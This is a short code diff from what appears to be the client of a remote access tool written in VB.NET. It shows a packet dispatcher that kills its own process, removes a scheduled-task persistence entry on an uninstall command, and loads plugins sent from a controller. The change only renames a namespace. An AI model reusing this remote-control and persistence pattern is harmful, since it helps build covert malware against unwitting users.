@@ -29,9 +29,9 @@ Namespace Client
 						EntryClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)
 
 					Case (PacketType.UNINSTALL_CLOSE_CLIENT)
-						Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName)
+                        Offline.Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName)
 
-					Case Else
+                    Case Else
 						pluginDelegateAsync.BeginInvoke(packet, New AsyncCallback(AddressOf EndLoadPlugin), Nothing)
 
 				End Select
